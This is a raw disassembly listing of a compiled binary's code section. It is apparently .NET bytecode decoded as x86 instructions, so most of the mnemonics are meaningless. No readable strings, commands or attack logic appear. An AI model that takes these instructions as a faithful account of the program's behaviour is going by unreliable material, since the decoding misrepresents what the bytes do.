  40310d:	00 00                	add    %al,(%eax)
  40310f:	01 1b                	add    %ebx,(%ebx)
  403111:	30 05 00 76 02 00    	xor    %al,0x27600
  403117:	00 06                	add    %al,(%esi)
  403119:	00 00                	add    %al,(%eax)
  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 fc       	add    $0xfc720511,%eax
  4031ba:	21 00                	and    %eax,(%eax)
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 04 22       	and    $0x22047216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 6e    	or     0x6e721825(%edx),%ah
  4031e4:	22 00                	and    (%eax),%al
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 80    	or     -0x7f8de5db(%edx),%ah
  4031f5:	22 00                	and    (%eax),%al
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 94             	or     -0x6c(%edx),%dh
  403227:	22 00                	and    (%eax),%al
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 f2             	or     -0xe(%edx),%dh
  403246:	22 00                	and    (%eax),%al
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 f2             	or     -0xe(%edx),%dh
  403251:	22 00                	and    (%eax),%al
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 f6                	jb     0x4032b9
  4032c3:	22 00                	and    (%eax),%al
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 00             	or     %esi,0x0(%edx)
  4032da:	23 00                	and    (%eax),%eax
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 14                	jb     0x4032fa
  4032e6:	23 00                	and    (%eax),%eax
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 34                	jb     0x403326
  4032f2:	23 00                	and    (%eax),%eax
  4032f4:	70 06                	jo     0x4032fc
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 f2             	or     -0xe(%edx),%dh
  4032fd:	22 00                	and    (%eax),%al
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 4a                	jb     0x403358
  40330e:	23 00                	and    (%eax),%eax
  403310:	70 28                	jo     0x40333a
  403312:	72 00                	jb     0x403314
  403314:	00 0a                	add    %cl,(%edx)
  403316:	28 6f 00             	sub    %ch,0x0(%edi)
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	71 00                	jno    0x40331e
  40331e:	00 0a                	add    %cl,(%edx)
  403320:	11 09                	adc    %ecx,(%ecx)
  403322:	72 52                	jb     0x403376
  403324:	23 00                	and    (%eax),%eax
  403326:	70 11                	jo     0x403339
  403328:	08 28                	or     %ch,(%eax)
  40332a:	73 00                	jae    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 5e                	jb     0x40338e
  403330:	23 00                	and    (%eax),%eax
  403332:	70 28                	jo     0x40335c
  403334:	68 00 00 0a 6f       	push   $0x6f0a0000
  403339:	71 00                	jno    0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	dd 0f                	fisttpll (%edi)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 6e                	jb     0x4034db
  40346d:	23 00                	and    (%eax),%eax
  40346f:	70 6f                	jo     0x4034e0
  403471:	7e 00                	jle    0x403473
  403473:	00 0a                	add    %cl,(%edx)
  403475:	39 07                	cmp    %eax,(%edi)
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 74             	adc    %esi,0x74(%edx)
  4034ae:	23 00                	and    (%eax),%eax
  4034b0:	70 73                	jo     0x403525
  4034b2:	7f 00                	jg     0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	0a 06                	or     (%esi),%al
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 ba 23    	or     0x23ba7209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	d4 23                	aam    $0x23
  4034ed:	00 70 28             	add    %dh,0x28(%eax)
  4034f0:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 00             	or     %esi,0x0(%edx)
  4034fc:	24 00                	and    $0x0,%al
  4034fe:	70 6f                	jo     0x40356f
  403500:	83 00 00             	addl   $0x0,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 0c             	or     0xc(%edx),%dh
  403510:	24 00                	and    $0x0,%al
  403512:	70 6f                	jo     0x403583
  403514:	7e 00                	jle    0x403516
  403516:	00 0a                	add    %cl,(%edx)
  403518:	3a 30                	cmp    (%eax),%dh
  40351a:	00 00                	add    %al,(%eax)
  40351c:	00 11                	add    %dl,(%ecx)
  40351e:	04 72                	add    $0x72,%al
  403520:	1c 24                	sbb    $0x24,%al
  403522:	00 70 6f             	add    %dh,0x6f(%eax)
  403525:	7e 00                	jle    0x403527
  403527:	00 0a                	add    %cl,(%edx)
  403529:	3a 1f                	cmp    (%edi),%bl
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 00                	jb     0x403531
  403531:	24 00                	and    $0x0,%al
  403533:	70 6f                	jo     0x4035a4
  403535:	83 00 00             	addl   $0x0,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 2a             	or     0x2a(%edx),%dh
  403540:	24 00                	and    $0x0,%al
  403542:	70 28                	jo     0x40356c
  403544:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 40             	adc    %esi,0x40(%edx)
  40362e:	24 00                	and    $0x0,%al
  403630:	70 28                	jo     0x40365a
  403632:	3a 00                	cmp    (%eax),%al
  403634:	00 06                	add    %al,(%esi)
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  40369f:	00 00                	add    %al,(%eax)
  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
